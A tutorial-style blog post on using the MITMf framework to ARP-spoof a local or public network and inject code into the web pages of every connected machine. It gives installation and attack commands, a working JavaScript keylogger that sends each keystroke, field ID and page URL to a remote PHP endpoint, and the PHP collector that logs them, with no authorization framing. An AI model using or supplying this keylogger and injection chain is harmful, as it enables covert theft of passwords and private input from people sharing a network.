## Introduction

In cryptography and computer security, a MITM attack (man-in-the-middle) is an attack where the attacker secretly relays and possibly alters the communication between two parties who believe they are directly communicating with each other. One example of man-in-the-middle attacks is active eavesdropping, in which the attacker makes independent connections with the victims and relays messages between them to make them believe they are talking directly to each other over a private connection, when in fact the entire conversation is controlled by the attacker. The attacker must be able to intercept all relevant messages passing between the two victims and inject new ones. This is straightforward in many circumstances; for example, an attacker within the reception range of an unencrypted wireless access point (Wi-Fi) could insert himself as a man-in-the-middle.

<div class="p-3 bg-secondary border">
    <h3 class="fs-5 m-0 mb-2">Table Of Contents</h3>
    <hr>
    <ul class="toc">
        <li><a href="#bookmark-1" data-scroll data-scroll-offset="100">What Is MITMF?</a></li>
        <li><a href="#bookmark-2" data-scroll data-scroll-offset="100">MITMF Features</a></li>
        <li><a href="#bookmark-3" data-scroll data-scroll-offset="100">Install MITMF</a></li>
        <li><a href="#bookmark-4" data-scroll data-scroll-offset="100">How It Works?</a></li>
        <li>
            <a href="#bookmark-5" data-scroll data-scroll-offset="100">Deploy The Attack</a>
            <ul>
                <li><a href="#bookmark-5-1" data-scroll data-scroll-offset="100">Create JS Keylogger file</a></li>
                <li><a href="#bookmark-5-2" data-scroll data-scroll-offset="100">Create PHP Keylogger file</a></li>
                <li><a href="#bookmark-5-3" data-scroll data-scroll-offset="100">Inject the JS file</a></li>
            </ul>
        </li>
        <li><a href="#bookmark-6" data-scroll data-scroll-offset="100">Conclusion</a></li>
    </ul>
</div>

* * *

<div id="bookmark-1"></div>

## What Is MITMF?

As an attack that aims at circumventing mutual authentication, or lack thereof, a man-in-the-middle attack can succeed only when the attacker can impersonate each endpoint to their satisfaction as expected from the legitimate ends. Most cryptographic protocols include some form of endpoint authentication specifically to prevent MITM attacks. For example, TLS can authenticate one or both parties using a mutually trusted certificate authority. MITMf aims to provide a one-stop-shop for Man-In-The-Middle and network attacks while updating and improving existing attacks and techniques.

Originally built to address the significant shortcomings of other tools (e.g Ettercap, Mallory), it's been almost completely re-written from scratch to provide a modular and easily extendible framework that anyone can use to implement their MITM attack.

![How to Use DNS Poisoning to Redirect Users to Fake Website](https://neoslab.com/uploads/medias/2021/08/how-to-use-dns-poisoning-to-redirect-users-to-fake-website-1.png "How to Use DNS Poisoning to Redirect Users to Fake Website")

* * *

<div id="bookmark-2"></div>

## MITMF Features

- The framework contains a built-in SMB, HTTP and DNS server that can be controlled and used by the various plugins, it also contains a modified version of the SSLStrip proxy that allows for HTTP modification and a partial HSTS bypass.
- As of version 0.9.8, MITMf supports active packet filtering and manipulation (basically what etterfilters did, only better), allowing users to modify any type of traffic or protocol.
- The configuration file can be edited on-the-fly while MITMf is running, the changes will be passed down through the framework: this allows you to tweak settings of plugins and servers while performing an attack.
- MITMf will capture FTP, IRC, POP, IMAP, Telnet, SMTP, SNMP (community strings), NTLMv1/v2 (all supported protocols like HTTP, SMB, LDAP, etc.) and Kerberos credentials by using Net-Creds, which is run on startup.
- Responder integration allows for LLMNR, NBT-NS, and MDNS poisoning and WPAD rogue server support.

**Source:** [github.com](https://github.com/byt3bl33d3r/MITMf/)

* * *

<div id="bookmark-3"></div>

## Install MITMF

Installing MITMf is quite easy and doesn't require advanced skills. To do it just open your terminal and type one by one the below commands.

**On Arch Linux**

```html
pacman -S python2-setuptools libnetfilter_queue libpcap libjpeg-turbo capstone
```

**On Debian and derivatives such as Ubuntu, Kali Linux etc ...**

```html
sudo apt install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file
```

If you're using Arch Linux just remember to use "**pip2**" instead of "**pip**" outside of the "**virtualenv**".

**Install virtualenvwrapper**

```html
pip install virtualenvwrapper
```

Edit your .bashrc or .zshrc file to source the virtualenvwrapper.sh script.

```html
source /usr/bin/virtualenvwrapper.sh
```

The location of this script may vary depending on your Linux distro. When you are done simply restart your terminal or run:

```html
source /usr/bin/virtualenvwrapper.sh
```

**Create your virtualenv**

```html
mkvirtualenv MITMf -p /usr/bin/python2.7
```

**Clone the MITMf repository**

```html
cd /opt/
sudo git clone https://github.com/byt3bl33d3r/MITMf mitmf
cd mitmf && sudo git submodule init && sudo git submodule update --recursive
sudo pip install -r requirements.txt
chmod +x mitmf.py
```

* * *

<div id="bookmark-4"></div>

## How It Works?

The attack schema is pretty simple actually. The attacking machine needs to connect to a network where other machines are connected. This can be a home network, an office network, a cyber cafe network or either a public hotspot.

Once the attacking machine is connected, you will have to run the commands we provided below to inject your arbitrary code into all the machines connected in the same network then the attacking machine.

Before to move further you will need to grab your gateway address and your network interface. You can do it simply using "**ifconfig**" and "**iproute**" commands as the following examples.

**Find my interface name**

```html
ifconfig
```
**Output**

![How to Use DNS Poisoning to Redirect Users to Fake Website](https://neoslab.com/uploads/medias/2021/08/how-to-use-dns-poisoning-to-redirect-users-to-fake-website-2.png "How to Use DNS Poisoning to Redirect Users to Fake Website")

As you can see in the above screenshot, in our case the interface name is "wlp2s0".

**Find my router gateway**

```html
ip route
```

**Output**

![How to Use DNS Poisoning to Redirect Users to Fake Website](https://neoslab.com/uploads/medias/2021/08/how-to-use-dns-poisoning-to-redirect-users-to-fake-website-3.png "How to Use DNS Poisoning to Redirect Users to Fake Website")

From the above output, it is clear that 192.168.1.1 is the default gateway IP address.

**Inject HTML Code**

```html
cd ~/
mkdir demo && cd demo
echo '<div>HTML code to inject</div>' > ~/demo/inject.html
cd /opt/mitmf/
sudo ./mitmf.py --inject --html-file ~/demo/inject.html --spoof --arp --gateway 192.168.1.1 -i wlp2s0
```

**Inject JS Code**

```html
cd ~/
mkdir demo && cd demo
echo '<script type="text/javascript">alert("JS code to inject");</script>' > ~/demo/inject.js
cd /opt/mitmf/
sudo ./mitmf.py --inject --js-file ~/demo/inject.js --spoof --arp --gateway 192.168.1.1 -i wlp2s0
```

**Important:** If you have Apache and/or SMB installed, you will need to stop those services before to run MITMf to avoid any port conflict.

* * *

<div id="bookmark-5"></div>

## Deploy The Attack

For our test, we will choose the second option, by injecting a Web-Based Keylogger in JavaScript which will be present on every page visited by each machine connected to the network. The keylogger will grab all the user's keystrokes and send them to a remote server. We have published a few weeks ago another tutorial explains how to [create a web-based keylogger in javascript](https://neoslab.com/2021/06/28/how-to-create-a-web-based-php-javascript-keylogger/) which can be useful if you want to understand how a keylogger works.

<div id="bookmark-5-1"></div>

### Create JS Keylogger file - keylogger.js

```html
if((window.jQuery))
{ 
    console.log("jQuery Found");
}
else
{ 
    console.log("jQuery Not Found");
    var script = document.createElement('script');
    script.src = 'https://code.jquery.com/jquery-3.3.1.min.js';
    document.body.appendChild(script);
}

function c(d)
{
    jQuery.ajax(
    { 
        dataType: "jsonp",
        type: "GET",
        url: "https://example.com/keylogger.php",
        jsonp: "keypressed",
        data: 
        { 
            altnKey: d.altKey ? 1:0,
            ctrlKey: d.ctrlKey ? 1:0,
            userKey: d.key,
            targKey: d.target.id,
            userURI: d.target.baseURI
        },
        async: false,
        success: function(data)
        { 
            console.log(data);
        },
        error: function(xhr, ajaxOptions, thrownError)
        { 
            console.log("Error");
        }
    });
}

window.onload = function()
{ 
    window.addEventListener("keydown", function(e)
    { 
        c(e);
    });
}
```

Please be sure to replace "[https://example.com/keylogger.php](https://example.com/keylogger.php)" with the real URL of your PHP file.

<div id="bookmark-5-2"></div>

### Create PHP Keylogger file - keylogger.php

```html
header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
header('Access-Control-Allow-Methods: GET, REQUEST, OPTIONS');
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: Content-Type, *');
$file = 'data.txt';
if(!file_exists($file))
{ 
    $fh = fopen($file, 'w');
}

function f($str)
{ 
    return trim(preg_replace("(\\\)","",htmlentities(strip_tags($str),ENT_QUOTES,'UTF-8')));
}

$altnKey = (int)$_GET['altnKey'];
$ctrlKey = (int)$_GET['ctrlKey'];
$userKey = f($_GET['userKey']);
$targKey = f($_GET['targKey']);
$userURI = f($_GET['URI']);
$string = $altnKey."|".$ctrlKey."|".$userKey."|".$targKey."|".$userURI." ";
file_put_contents($file, $string, FILE_APPEND);
```

The "keylogger.php" must be hosted to a remote server and the full file URL must be specified in the "keylogger.js" file.

<div id="bookmark-5-3"></div>

### Inject the JS file

Now that we are ready with our file, we must inject the JavaScript to the network. To do it, we will use the below command.

```html
cd /opt/mitmf/
sudo ./mitmf.py --inject --js-file ~/demo/keylogger.js --spoof --arp --gateway 192.168.1.1 -i wlp2s0
```

**Output**

![How to Use DNS Poisoning to Redirect Users to Fake Website](https://neoslab.com/uploads/medias/2021/08/how-to-use-dns-poisoning-to-redirect-users-to-fake-website-4.png "How to Use DNS Poisoning to Redirect Users to Fake Website")

* * *

<div id="bookmark-6"></div>

## Conclusion

In the realm of cybersecurity, the man-in-the-middle (MITM) attack stands as a formidable threat. By clandestinely intercepting and manipulating communication between unsuspecting parties, the attacker undermines trust and confidentiality. Whether achieved through active eavesdropping or Wi-Fi infiltration, the MITM attack exploits vulnerabilities in cryptographic protocols.